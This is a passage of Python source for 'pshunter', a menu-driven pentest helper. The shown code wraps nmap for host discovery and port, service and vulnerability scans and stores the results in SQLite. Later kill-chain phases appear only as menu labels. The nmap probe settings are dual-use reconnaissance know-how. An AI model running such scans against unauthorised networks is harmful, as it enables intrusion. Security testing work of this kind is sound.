#!/usr/bin/env python3
"""pshunter — guided offensive workflow runner (skeleton).

A phase-driven companion for pentest / CTF work: it walks a target through the
classic kill-chain stages — host discovery, port enumeration, service detection,
vulnerability scanning, CVE lookup and service exploitation — one deliberate step
at a time. Every phase records what it found so the operator can review progress
via [s] status and browse results via [d] database.

This file is an early skeleton: it draws the banner, lays out the menu and routes
the user's choice to placeholder handlers. The real engines (nmap wrappers, the
SQLite store and the qtermwidget shell-spawning) are intentionally not wired yet.

Authorised use only. Run pshunter exclusively against assets you own or are
explicitly permitted to test.
"""

from __future__ import annotations

import atexit
import ipaddress
import json
import os
import random
import re
import shlex
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
from datetime import datetime


# ── terminal colours ──────────────────────────────────────────────────────────
# Auto-disabled when output is not a TTY or NO_COLOR is set, so piping stays clean.
_COLOR = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None


def _c(code: str) -> str:
    return code if _COLOR else ""


RESET   = _c("\033[0m")
BOLD    = _c("\033[1m")
DIM     = _c("\033[2m")
CYAN    = _c("\033[36m")
GREEN   = _c("\033[32m")
RED     = _c("\033[31m")
YELLOW  = _c("\033[33m")
MAGENTA = _c("\033[35m")
BROWN   = _c("\033[38;2;205;133;63m")   # 24-bit brown (peru) for the options hint line


APP_NAME    = "pshunter"
APP_TAGLINE = "modular offensive security toolkit"
APP_VERSION = "1.0"


# ── banner ────────────────────────────────────────────────────────────────────
def _fallback_banner() -> str:
    """Hand-drawn banner used when pyfiglet is unavailable."""
    return r"""
           _                 _
 _ __  ___| |__  _   _ _ __ | |_ ___ _ __
| '_ \/ __| '_ \| | | | '_ \| __/ _ \ '__|
| |_) \__ \ | | | |_| | | | | ||  __/ |
| .__/|___/_| |_|\__,_|_| |_|\__\___|_|
|_|
"""


def render_banner() -> str:
    """ASCII-art app name. Prefers pyfiglet (ansi_shadow), falls back to a static
    banner so the tool still runs without the dependency."""
    try:
        from pyfiglet import Figlet
        return Figlet(font="ansi_shadow", width=200).renderText(APP_NAME).rstrip("\n")
    except Exception:
        return _fallback_banner().rstrip("\n")


def print_header() -> None:
    print(CYAN + BOLD + render_banner() + RESET)
    print()
    print(f"{DIM}  {APP_TAGLINE} · v{APP_VERSION}{RESET}")
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print(f"{YELLOW}  ⚠ unprivileged — running as a normal user{RESET}"
              f"{DIM} — press {RESET}{YELLOW}[u]{RESET}{DIM} upgrade{RESET}")
    else:
        print(f"{GREEN}  ● root — full scan capability (raw sockets){RESET}")
    print()


# ── phases (the offensive kill-chain, in order) ───────────────────────────────
# Each entry: (menu key, name, one-line intent). The order is the recommended
# progression; nothing forces it, but later phases build on earlier findings.
PHASES = [
    ("0", "Host discovery",       "find which hosts are alive on the target scope"),
    ("1", "Port enumeration",     "map open TCP/UDP ports on a live host"),
    ("2", "Service detection",    "fingerprint the service/version behind each port"),
    ("3", "Vuln scan",            "run vulnerability checks against detected services"),
    ("4", "CVE lookup",           "match service CPEs to known CVEs"),
    ("5", "Service exploitation", "attempt exploitation / access on a chosen service"),
    ("6", "Privilege Escalation", "escalate to root / SYSTEM on a compromised host"),
    ("7", "Persistence",          "maintain access on a compromised host"),
    ("8", "Covering Tracks",      "clean up artifacts after an authorised engagement"),
]
_PHASES = {key: (name, desc) for key, name, desc in PHASES}


# ── scan-time budget ──────────────────────────────────────────────────────────
MIN_MINUTES = 1        # floor
MAX_MINUTES = 1440     # ceiling: 24 h
DEFAULT_MINUTES = 10   # Enter accepts this


# ── navigation words (accepted at any sub-prompt) ─────────────────────────────
_BACK_WORDS = {"b", "back"}
_HELP_WORDS = {"h", "help", "?"}
_MENU_WORDS = {"m", "menu"}          # jump straight back to the main menu (any depth)


# ── menu ──────────────────────────────────────────────────────────────────────
def print_menu() -> None:
    print(f"  {DIM}workflow{RESET}")
    for key, name, desc in PHASES:
        print(f"  {CYAN}[{key}]{RESET} {BOLD}{name}{RESET}")
    print()
    print(f"  {DIM}actions{RESET}")
    print(f"  {CYAN}[s]{RESET} {BOLD}status{RESET}")
    print(f"  {CYAN}[d]{RESET} {BOLD}database{RESET}")
    print(f"  {CYAN}[c]{RESET} {BOLD}catalog{RESET}")
    print(f"  {CYAN}[n]{RESET} {BOLD}new session{RESET}")
    if not _is_root():
        print(f"  {CYAN}[u]{RESET} {BOLD}upgrade{RESET}")
    print(f"  {CYAN}[h]{RESET} {BOLD}help{RESET}")
    print()
    print(f"  {DIM}/exit  quit{RESET}")


# ── help ──────────────────────────────────────────────────────────────────────
def print_help() -> None:
    """Full usage — kept off the main screen so it stays clean."""
    print(f"\n{BOLD}{CYAN}pshunter — help{RESET}\n")

    print(f"{BOLD}Phases{RESET}")
    for key, name, desc in PHASES:
        print(f"  {CYAN}[{key}]{RESET} {BOLD}{name:<20}{RESET}{DIM} {desc}{RESET}")
    print()

    print(f"{BOLD}Host discovery — target formats{RESET}")
    print(f"  {DIM}192.168.1.0/24{RESET}             subnet in CIDR notation")
    print(f"  {DIM}192.168.1.0{RESET}                bare IP — assumed /24")
    print(f"  {DIM}192.168.1.10-192.168.1.40{RESET}  range, full end address")
    print(f"  {DIM}192.168.1.10-40{RESET}            range, end = last octet")
    print()

    print(f"{BOLD}Time budget{RESET}")
    print(f"  {DIM}minutes · Enter = {DEFAULT_MINUTES} · {MIN_MINUTES}–{MAX_MINUTES} (24 h){RESET}")
    print()

    print(f"{BOLD}Menu actions{RESET}")
    print(f"  {BOLD}status{RESET}     command history + state; {BOLD}v <n>{RESET} view command+output "
          f"in a new terminal, {BOLD}stop <n>{RESET} abort, {BOLD}c{RESET} clear finished")
    print(f"  {BOLD}database{RESET}   discovered hosts; type a number for its ports, "
          f"{BOLD}r <n>{RESET} remove, {BOLD}c{RESET} wipe all")
    print(f"  {DIM}           inside a host: {BOLD}[f]{RESET}{DIM} findings, {BOLD}[p]{RESET}{DIM} progress "
          f"(per-phase tracker — which phases ran and what's pending; a number runs one){RESET}")
    print(f"  {BOLD}catalog{RESET}    supported services in exploitation order (bold = wired "
          f"tools implemented); type a number to see that service's steps")
    print(f"  {BOLD}new session{RESET}  wipe the whole database (hosts + history) for a fresh start")
    print(f"  {BOLD}upgrade{RESET}      re-run under sudo for root (SYN/UDP scans); progress is kept")
    print()

    print(f"{BOLD}Navigation{RESET}")
    print(f"  {BOLD}h{RESET} / {BOLD}help{RESET} / {BOLD}?{RESET}   show this screen")
    print(f"  {BOLD}b{RESET} / {BOLD}back{RESET}       return to the menu")
    print(f"  {BOLD}/exit{RESET}          quit pshunter")
    print()


# ── input helper ──────────────────────────────────────────────────────────────
class _ExitApp(Exception):
    """Raised from any prompt when the user types /exit — quits the whole app."""


class _ToMenu(Exception):
    """Raised from any prompt when the user types m/menu — pops out of every nested view
    straight back to the main menu (the main loop catches it and just redraws the menu)."""


def _ask(label: str) -> "str | None":
    """Prompt for a line. Returns the stripped text, or None if the user aborts
    (Ctrl+C / EOF) — callers treat None as 'back to the menu'. Typing /exit anywhere
    raises _ExitApp (quit); m/menu raises _ToMenu (jump to the main menu)."""
    try:
        value = input(f"{BOLD}{label}{RESET} ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return None
    low = value.lower()
    if low in ("/exit", "\\exit"):
        raise _ExitApp
    if low in _MENU_WORDS:
        raise _ToMenu
    return value


def _ctx_ask(module: str, options: str = "") -> "str | None":
    """Prompt tagged with the module you're in (coloured, for readability) and, one
    line above, a short hint of what you can type — tinted brown so it reads as
    interactive options, distinct from normal output."""
    if options:
        print(f"  {BROWN}{options}{RESET}")
    return _ask(f"{CYAN}[{module}]{RESET}{DIM} ›{RESET}")


def _hr() -> None:
    """Thin divider used inside interactive views to separate one chosen action's
    output from the next."""
    print(f"{DIM}{'─' * 56}{RESET}")


# ── host discovery (phase 1) ──────────────────────────────────────────────────
# A range wider than this is refused for expansion — use CIDR instead (nmap can
# only express an arbitrary start-end as a single token when the hosts share the
# same /24; otherwise we would have to hand nmap a huge explicit target list).
_MAX_RANGE_EXPAND = 8192


def parse_discovery_target(value: str) -> "tuple[bool, str, dict]":
    """Validate a host-discovery scope. Accepts a CIDR subnet, a bare IP (taken as
    /24), or an inclusive range ``start-end`` where ``end`` is either a full IPv4
    address or just the final octet. Returns ``(ok, error, parsed)`` where, on
    success, ``parsed = {"scope": <str>, "hosts": <int>, "targets": [<nmap arg>…]}``.
    """
    value = value.strip()
    if not value:
        return False, "empty — give a subnet or range", {}

    if "-" in value:                                   # start-end range (IPv4)
        left, _, right = value.partition("-")
        try:
            start = ipaddress.ip_address(left.strip())
        except ValueError:
            return False, "range start is not a valid IPv4 address", {}
        if start.version != 4:
            return False, "ranges are IPv4 only", {}
        right = right.strip()
        if "." in right:
            try:
                end = ipaddress.ip_address(right)
            except ValueError:
                return False, "range end is not a valid IPv4 address", {}
        elif right.isdigit() and 0 <= int(right) <= 255:
            end = ipaddress.ip_address((int(start) & 0xFFFFFF00) | int(right))
        else:
            return False, "range end must be an IP or a 0-255 octet", {}
        if int(end) < int(start):
            return False, "range end is before its start", {}
        hosts = int(end) - int(start) + 1
        if int(start) >> 8 == int(end) >> 8:           # same /24 -> compact nmap token
            targets = [f"{str(start).rsplit('.', 1)[0]}.{int(start) & 0xFF}-{int(end) & 0xFF}"]
        elif hosts <= _MAX_RANGE_EXPAND:               # spans /24s -> explicit list
            targets = [str(ipaddress.ip_address(i)) for i in range(int(start), int(end) + 1)]
        else:
            return False, "range too large — use CIDR notation", {}
        return True, "", {"scope": f"{start}-{end}", "hosts": hosts, "targets": targets}

    if "/" not in value:                               # bare IP -> assume a mask
        try:
            addr = ipaddress.ip_address(value)
        except ValueError:
            return False, "not a valid IP address", {}
        value = f"{value}/{24 if addr.version == 4 else 64}"

    try:
        net = ipaddress.ip_network(value, strict=False)
    except ValueError:
        return False, "not a valid subnet (CIDR)", {}
    return True, "", {"scope": str(net), "hosts": net.num_addresses, "targets": [str(net)]}


def _prompt_minutes(module: str, title: str, detail: str) -> "int | None":
    """Show a one-line summary (title + detail + default time) and read the time
    budget. Enter accepts the default; a number is validated to 1–1440."""
    print(f"\n{GREEN}✓{RESET} {BOLD}{title}{RESET} · {detail} · {DIM}⏱ {DEFAULT_MINUTES}m{RESET}")
    while True:
        v = _ctx_ask(module, f"<minutes {MIN_MINUTES}-{MAX_MINUTES}, Enter={DEFAULT_MINUTES}> · [h] help · [b] back · [m] menu")
        if v is None or v.lower() in _BACK_WORDS:
            return None
        if v.lower() in _HELP_WORDS:
            print_help()
            continue
        if v == "":
            return DEFAULT_MINUTES
        if v.isdigit() and MIN_MINUTES <= int(v) <= MAX_MINUTES:
            return int(v)
        print(f"{RED}✗ 1–{MAX_MINUTES} minutes{RESET}")


def _handle_host_discovery() -> None:
    """Phase 1 flow: read + validate the scope, then the time, then launch."""
    while True:
        value = _ctx_ask("discovery", "<subnet / range> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        ok, err, parsed = parse_discovery_target(value)
        if not ok:
            print(f"{RED}✗ {err}{RESET}")
            continue
        minutes = _prompt_minutes("discovery", "Host discovery",
                                  f"{parsed['scope']} · {parsed['hosts']} host(s)")
        if minutes is None:
            return
        _start_discovery(parsed, minutes)
        print(f"\n{GREEN}▶ host discovery running in the background{RESET} "
              f"{DIM}({parsed['scope']}, ⏱ {minutes}m) — check {BOLD}[s] status{RESET}")
        return


def _handle_port_enum() -> None:
    """Phase 2 flow: read + validate a single target IP, then the time, then launch
    the concurrent port scans."""
    while True:
        value = _ctx_ask("ports", "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        minutes = _prompt_minutes("ports", "Port enumeration", ip)
        if minutes is None:
            return
        _start_port_enum(ip, minutes)
        print(f"\n{GREEN}▶ port enumeration running in the background{RESET} "
              f"{DIM}({ip} · fast + full TCP + UDP, ⏱ {minutes}m) — check {BOLD}[s] status{RESET}")
        return


def _handle_service_detection() -> None:
    """Phase 3 flow: read a target IP, then the time, then launch -sV -sC (+ OS) on the
    open ports discovered in phase 2."""
    while True:
        value = _ctx_ask("service", "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        if not fetch_ports(ip):
            print(f"{DIM}note: no open ports recorded for {ip} — run {BOLD}[1] Port "
                  f"enumeration{RESET}{DIM} first (OS scan still runs if root){RESET}")
        minutes = _prompt_minutes("service", "Service detection", ip)
        if minutes is None:
            return
        _start_service_detection(ip, minutes)
        print(f"\n{GREEN}▶ service detection running in the background{RESET} "
              f"{DIM}({ip} · -sV -sC + OS, ⏱ {minutes}m) — check {BOLD}[s] status{RESET}")
        return


def _handle_vuln_scan() -> None:
    """Phase 4 flow: read a target IP, then the time, then launch targeted vuln/auth
    NSE scans mapped to the host's detected services."""
    while True:
        value = _ctx_ask("vuln", "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        if not fetch_ports(ip):
            print(f"{DIM}note: no open ports recorded for {ip} — run {BOLD}[1] Port "
                  f"enumeration{RESET}{DIM} (and {BOLD}[2] Service detection{RESET}{DIM}) first{RESET}")
            continue
        print(f"{DIM}vuln + auth scripting{RESET}")
        minutes = _prompt_minutes("vuln", "Vuln scan", ip)
        if minutes is None:
            return
        _start_vuln_scan(ip, minutes)
        print(f"\n{GREEN}▶ vuln scan running in the background{RESET} "
              f"{DIM}({ip} · targeted NSE vuln+auth, ⏱ {minutes}m) — check {BOLD}[s] status{RESET}")
        return


# ── host-discovery nmap engine ────────────────────────────────────────────────
# Two passes, per OSCP/HTB practice. Pass 1 is a fast default sweep: as root, -sn
# already fires ICMP echo + TCP SYN 443 + TCP ACK 80 + ICMP timestamp, and ARP on
# a local segment — this catches the easy, responsive hosts quickly. Pass 2 is a
# thorough multi-probe sweep for hosts that drop the common probes: extra ICMP
# types plus TCP SYN/ACK and UDP probes across the ports firewalls usually let
# through (web/DNS/SMB/RDP/SNMP). Sent in parallel so at least one gets through.
# Both use -n (no DNS) for speed; results from the two passes are unioned.
_DISCOVERY_FAST = ["-sn", "-n", "-T4", "--max-retries", "1"]
_DISCOVERY_SLOW = [
    "-sn", "-n", "-T3",
    "-PE", "-PP", "-PM",                                     # ICMP echo / timestamp / netmask
    "-PS21,22,23,25,53,80,110,139,443,445,3389,8080",       # TCP SYN to common open ports
    "-PA80,443,3389",                                        # TCP ACK (bypass stateless SYN blocks)
    "-PU53,161,137",                                         # UDP to DNS / SNMP / NetBIOS
]


def _safe_unlink(path: str) -> None:
    try:
        os.unlink(path)
    except OSError:
        pass


def _host_from_elem(elem) -> "dict | None":
    """Build an up-host dict from one nmap ``<host>`` XML element (no ports: -sn)."""
    st = elem.find("status")
    if st is None or st.get("state") != "up":
        return None
    ip = mac = vendor = hostname = None
    for addr in elem.findall("address"):
        kind = addr.get("addrtype")
        if kind == "ipv4":
            ip = addr.get("addr")
        elif kind == "mac":
            mac, vendor = addr.get("addr"), addr.get("vendor")
    if not ip:
        return None
    hn = elem.find("hostnames/hostname")
    if hn is not None:
        hostname = hn.get("name")
    return {"ip": ip, "mac": mac, "vendor": vendor, "hostname": hostname}


def _host_ports_from_elem(elem) -> "dict | None":
    """Extract open (or open|filtered) ports from one nmap ``<host>`` element. Each
    port keeps its state and, when present, nmap's service guess (name/product/
    version) — filled in properly later by the service-detection phase."""
    ip = None
    for addr in elem.findall("address"):
        if addr.get("addrtype") == "ipv4":
            ip = addr.get("addr")
    if not ip:
        return None
    rows = []
    for port in elem.findall("ports/port"):
        pstate = port.find("state")
        state = pstate.get("state") if pstate is not None else None
        if state not in ("open", "open|filtered"):
            continue
        svc = port.find("service")
        service = None
        if svc is not None:
            service = {"name": svc.get("name"), "product": svc.get("product"),
                       "version": svc.get("version")}
        rows.append({"port": int(port.get("portid")), "proto": port.get("protocol") or "tcp",
                     "state": state, "service": service})
    return {"ip": ip, "ports": rows} if rows else None


def _host_detail_from_elem(elem) -> "dict | None":
    """Extract service-detection results from one nmap ``<host>`` element: probed
    services (name/product/version/cpe), NSE (-sC) script output per port (plus any
    host-level scripts under port 0), and the best OS match."""
    ip = None
    for addr in elem.findall("address"):
        if addr.get("addrtype") == "ipv4":
            ip = addr.get("addr")
    if not ip:
        return None
    services, scripts, hostnames = [], [], []
    for port in elem.findall("ports/port"):
        portid = int(port.get("portid"))
        proto = port.get("protocol") or "tcp"
        svc = port.find("service")
        if svc is not None and svc.get("method") == "probed":
            cpe = None
            for c in svc.findall("cpe"):
                txt = (c.text or "").strip()
                if txt and (cpe is None or txt.startswith("cpe:/a")):
                    cpe = txt                       # prefer the application CPE
            services.append({"port": portid, "proto": proto, "name": svc.get("name"),
                             "product": svc.get("product"), "version": svc.get("version"),
                             "cpe": cpe})
            if svc.get("hostname"):                 # nmap resolves a name (often the TLS cert CN)
                hostnames.append({"port": portid, "hostname": svc.get("hostname"), "source": "service"})
        for scr in port.findall("script"):
            scripts.append({"port": portid, "proto": proto,
                            "id": scr.get("id"), "output": scr.get("output")})
    for scr in elem.findall("hostscript/script"):   # host-level scripts (port 0)
        scripts.append({"port": 0, "proto": "", "id": scr.get("id"),
                        "output": scr.get("output")})
    om = elem.find("os/osmatch")
    os_name = om.get("name") if om is not None else None
    if not (services or scripts or os_name):
        return None
    return {"ip": ip, "services": services, "scripts": scripts, "os": os_name,
            "hostnames": hostnames}


def _run_nmap(args: list, targets: list, on_items, deadline: "float | None" = None,
              should_stop=None, parse_elem=None):
    """Run nmap (XML to a temp file), tail it with an incremental parser and hand each
    parsed ``<host>`` element to ``on_items`` as it appears. ``parse_elem`` turns an
    element into an item (defaults to the host parser for -sn; the port parser is used
    for port scans). XML feeds the parser; nmap's normal stdout is captured separately
    (for the report terminal). Returns ``(items, output_text)``, or ``(None, None)`` if
    nmap is missing. ``deadline`` hard-caps the run; ``should_stop`` is polled each tick
    to kill it early. Whatever streamed so far is kept."""
    parse_elem = parse_elem or _host_from_elem
    import xml.etree.ElementTree as ET
    tmp = tempfile.NamedTemporaryFile(prefix="pshunter_", suffix=".xml", delete=False)
    tmp.close()
    out = tempfile.NamedTemporaryFile(prefix="pshunter_out_", suffix=".txt", delete=False)
    full = ["nmap", "-oX", tmp.name] + args + targets
    try:
        proc = subprocess.Popen(full, stdout=out, stderr=subprocess.STDOUT,
                                stdin=subprocess.DEVNULL, start_new_session=True)
    except FileNotFoundError:
        out.close()
        _safe_unlink(tmp.name)
        _safe_unlink(out.name)
        return None, None
    out.close()

    parser = ET.XMLPullParser(("end",))
    all_items, pending, pos = [], [], 0
    start = time.time()

    def _flush():
        if pending:
            on_items(list(pending))
            all_items.extend(pending)
            pending.clear()

    def _consume():
        nonlocal pos
        try:
            with open(tmp.name, "rb") as fh:
                fh.seek(pos)
                chunk = fh.read()
                pos = fh.tell()
        except OSError:
            chunk = b""
        if chunk:
            try:
                parser.feed(chunk)
            except ET.ParseError:
                pass
            for _ev, elem in parser.read_events():
                if elem.tag == "host":
                    item = parse_elem(elem)
                    if item:
                        pending.append(item)
                    elem.clear()
        return chunk

    try:
        while True:
            alive = proc.poll() is None
            chunk = _consume()
            if len(pending) >= 8:
                _flush()
            if not alive and not chunk:
                break
            timed_out = deadline is not None and (time.time() - start) > deadline
            if timed_out or (should_stop is not None and should_stop()):
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
                _consume()
                break
            if alive:
                time.sleep(0.4)
        _flush()
    finally:
        _safe_unlink(tmp.name)
    try:
        with open(out.name, "r", encoding="utf-8", errors="replace") as fh:
            output = fh.read()
    except OSError:
        output = ""
    _safe_unlink(out.name)
    return all_items, output


# ── self-IP guard (never record loopback / the scanner's own address) ─────────
_OWN_ADDRS: "set | None" = None


def _own_addresses() -> set:
    """This machine's interface IPs, computed once and cached."""
    global _OWN_ADDRS
    if _OWN_ADDRS is None:
        addrs: set = set()
        try:
            out = subprocess.run(["ip", "-o", "addr", "show"], capture_output=True,
                                 text=True, timeout=10, stdin=subprocess.DEVNULL).stdout
            for line in out.splitlines():
                parts = line.split()
                for i, tok in enumerate(parts):
                    if tok in ("inet", "inet6") and i + 1 < len(parts):
                        addrs.add(parts[i + 1].split("/")[0])
        except (OSError, subprocess.SubprocessError):
            pass
        _OWN_ADDRS = addrs
    return _OWN_ADDRS


def _refresh_own_addresses() -> None:
    """Force the own-address cache to be recomputed (call at every scan start so a
    mid-session IP change — e.g. connecting a VPN — is reflected in the guard)."""
    global _OWN_ADDRS
    _OWN_ADDRS = None
    _own_addresses()


def _is_self_ip(ip: str) -> bool:
    """True for loopback or one of this machine's own interface addresses."""
    try:
        if ipaddress.ip_address(ip).is_loopback:
            return True
    except ValueError:
        return False
    return ip in _own_addresses()


# ── database (discovered hosts) ───────────────────────────────────────────────
# This script lives in appdata/terminal_modules/; keep the runtime DB up in appdata/
# (a data location) rather than next to the code.
DB_PATH = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "pshunter.db")
# Offline CPE→CVE index (built by the installer from NVD; see build_cve_index). Read-only.
CVE_INDEX_PATH = os.path.join(os.path.dirname(DB_PATH), "cve_index.db")
# CISA Known Exploited Vulnerabilities — CVE ids actually exploited in the wild. Bundled
# text file (one CVE per line); used to surface KEV matches first in the findings view.
KEV_PATH = os.path.join(os.path.dirname(DB_PATH), "kev.txt")
_KEV_CACHE: "set | None" = None


def _load_kev() -> set:
    """The set of CISA KEV CVE ids (cached). Empty if the file is missing."""
    global _KEV_CACHE
    if _KEV_CACHE is None:
        kev = set()
        try:
            with open(KEV_PATH, encoding="utf-8") as fh:
                for line in fh:
                    line = line.strip()
                    if line.startswith("CVE-"):
                        kev.add(line)
        except OSError:
            pass
        _KEV_CACHE = kev
    return _KEV_CACHE
_DB_LOCK = threading.Lock()
_SCHEMA = """
CREATE TABLE IF NOT EXISTS hosts (
    ip          TEXT PRIMARY KEY,
    mac         TEXT,
    vendor      TEXT,
    hostname    TEXT,
    os          TEXT,
    first_seen  TEXT,
    last_seen   TEXT
);
CREATE TABLE IF NOT EXISTS jobs (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    created     TEXT,
    phase       TEXT,
    name        TEXT,
    command     TEXT,
    state       TEXT,
    hosts       INTEGER,
    error       TEXT,
    output      TEXT,
    run         TEXT
);
CREATE TABLE IF NOT EXISTS ports (
    ip          TEXT,
    port        INTEGER,
    proto       TEXT,
    state       TEXT,
    first_seen  TEXT,
    last_seen   TEXT,
    source      TEXT,
    PRIMARY KEY (ip, port, proto)
);
CREATE TABLE IF NOT EXISTS services (
    ip          TEXT,
    port        INTEGER,
    proto       TEXT,
    name        TEXT,
    product     TEXT,
    version     TEXT,
    cpe         TEXT,
    first_seen  TEXT,
    last_seen   TEXT,
    source      TEXT,
    PRIMARY KEY (ip, port, proto)
);
CREATE TABLE IF NOT EXISTS scripts (
    ip          TEXT,
    port        INTEGER,
    proto       TEXT,
    script      TEXT,
    output      TEXT,
    first_seen  TEXT,
    last_seen   TEXT,
    PRIMARY KEY (ip, port, proto, script)
);
CREATE TABLE IF NOT EXISTS vulns (
    ip          TEXT,
    port        INTEGER,
    proto       TEXT,
    script      TEXT,
    state       TEXT,
    cve         TEXT,
    risk        TEXT,
    summary     TEXT,
    first_seen  TEXT,
    last_seen   TEXT,
    PRIMARY KEY (ip, port, proto, script)
);
CREATE TABLE IF NOT EXISTS exploit_steps (
    ip          TEXT,
    port        INTEGER,
    proto       TEXT,
    service     TEXT,
    step        INTEGER,
    status      TEXT,
    last_seen   TEXT,
    PRIMARY KEY (ip, port, proto, service, step)
);
CREATE TABLE IF NOT EXISTS hostnames (
    ip          TEXT,
    port        INTEGER,
    hostname    TEXT,
    source      TEXT,
    first_seen  TEXT,
    last_seen   TEXT,
    PRIMARY KEY (ip, hostname)
);
"""


def _chown_db_to_user() -> None:
    """When running as root via sudo, hand the DB and its WAL sidecar files back to the
    invoking user (SUDO_UID/GID). Called on every connection so ownership is kept
    correct continuously — surviving a crash / SIGKILL / terminal close, unlike an
    exit-time fixup. No-op when not root or not launched through sudo."""
    if not (hasattr(os, "geteuid") and os.geteuid() == 0):
        return
    uid = os.environ.get("SUDO_UID")
    if not uid:
        return
    try:
        uid, gid = int(uid), int(os.environ.get("SUDO_GID") or uid)
    except ValueError:
        return
    for suffix in ("", "-wal", "-shm"):          # SQLite WAL keeps two sidecar files
        path = DB_PATH + suffix
        if os.path.exists(path):
            try:
                os.chown(path, uid, gid)
            except OSError:
                pass


def _db_connect() -> "sqlite3.Connection":
    conn = sqlite3.connect(DB_PATH, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.executescript(_SCHEMA)
    # Migrate pre-existing tables that predate a column (IF NOT EXISTS above won't
    # alter an existing table).
    jcols = {r[1] for r in conn.execute("PRAGMA table_info(jobs)").fetchall()}
    if jcols and "output" not in jcols:
        conn.execute("ALTER TABLE jobs ADD COLUMN output TEXT")
    if jcols and "run" not in jcols:
        conn.execute("ALTER TABLE jobs ADD COLUMN run TEXT")
    hcols = {r[1] for r in conn.execute("PRAGMA table_info(hosts)").fetchall()}
    if hcols and "os" not in hcols:
        conn.execute("ALTER TABLE hosts ADD COLUMN os TEXT")
    for tbl in ("ports", "services"):            # source: NULL = scanned, 'manual' = user-entered
        cols = {r[1] for r in conn.execute(f"PRAGMA table_info({tbl})").fetchall()}
        if cols and "source" not in cols:
            conn.execute(f"ALTER TABLE {tbl} ADD COLUMN source TEXT")
    conn.commit()
    _chown_db_to_user()          # keep the DB user-owned even while running as root
    return conn


def save_hosts(hosts: list) -> int:
    """Upsert discovered hosts by IP; keeps first non-null mac/vendor/hostname/os."""
    if not hosts:
        return 0
    now = datetime.now().isoformat(timespec="seconds")
    saved = 0
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for h in hosts:
                ip = h.get("ip")
                if not ip or _is_self_ip(ip):       # never store loopback / own address
                    continue
                conn.execute(
                    "INSERT INTO hosts (ip, mac, vendor, hostname, os, first_seen, last_seen) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?) "
                    "ON CONFLICT(ip) DO UPDATE SET "
                    "  mac       = COALESCE(excluded.mac, mac), "
                    "  vendor    = COALESCE(excluded.vendor, vendor), "
                    "  hostname  = COALESCE(excluded.hostname, hostname), "
                    "  os        = COALESCE(excluded.os, os), "
                    "  last_seen = excluded.last_seen",
                    (ip, h.get("mac"), h.get("vendor"), h.get("hostname"), h.get("os"), now, now),
                )
                saved += 1
            conn.commit()
        finally:
            conn.close()
    return saved


def fetch_hosts() -> list:
    """(ip, mac, vendor, hostname, os, nports) rows, sorted by IP; nports is the count
    of open ports recorded for the host. [] if the DB is empty."""
    if not os.path.exists(DB_PATH):
        return []
    conn = sqlite3.connect(DB_PATH, timeout=30)
    try:
        rows = conn.execute(
            "SELECT h.ip, h.mac, h.vendor, h.hostname, h.os, "
            "  (SELECT COUNT(*) FROM ports p WHERE p.ip = h.ip) "
            "FROM hosts h").fetchall()
    except sqlite3.OperationalError:      # file exists but schema not created yet
        return []
    finally:
        conn.close()

    def _key(row):
        try:
            return (0, int(ipaddress.ip_address(row[0])))
        except ValueError:
            return (1, 0)
    rows.sort(key=_key)
    return rows


def save_ports(ip: str, rows: list, source: "str | None" = None) -> int:
    """Upsert open ports for a host by (ip, port, proto). When a scan carried a service
    guess (nmap's port->name table, or -sV later), it's upserted into the services
    table too — kept non-null so the service-detection phase only enriches it.
    ``source='manual'`` tags user-entered rows; a scanned upsert (source=None) never
    clears an existing tag (COALESCE), so a manual row stays flagged for removal."""
    if not ip or not rows or _is_self_ip(ip):
        return 0
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for r in rows:
                conn.execute(
                    "INSERT INTO ports (ip, port, proto, state, first_seen, last_seen, source) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?) "
                    "ON CONFLICT(ip, port, proto) DO UPDATE SET "
                    "  state = excluded.state, last_seen = excluded.last_seen, "
                    "  source = COALESCE(excluded.source, source)",
                    (ip, r["port"], r["proto"], r.get("state"), now, now, source),
                )
                svc = r.get("service") or {}
                if svc.get("name") or svc.get("product") or svc.get("version"):
                    conn.execute(
                        "INSERT INTO services (ip, port, proto, name, product, version, cpe, "
                        "first_seen, last_seen, source) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?) "
                        "ON CONFLICT(ip, port, proto) DO UPDATE SET "
                        "  name     = COALESCE(excluded.name, name), "
                        "  product  = COALESCE(excluded.product, product), "
                        "  version  = COALESCE(excluded.version, version), "
                        "  last_seen = excluded.last_seen, "
                        "  source   = COALESCE(excluded.source, source)",
                        (ip, r["port"], r["proto"], svc.get("name"), svc.get("product"),
                         svc.get("version"), None, now, now, source),
                    )
            conn.commit()
        finally:
            conn.close()
    return len(rows)


def _fetch(query: str, params: tuple) -> list:
    """Run a read query, returning [] if the DB/table isn't there yet."""
    if not os.path.exists(DB_PATH):
        return []
    conn = sqlite3.connect(DB_PATH, timeout=30)
    try:
        return conn.execute(query, params).fetchall()
    except sqlite3.OperationalError:
        return []
    finally:
        conn.close()


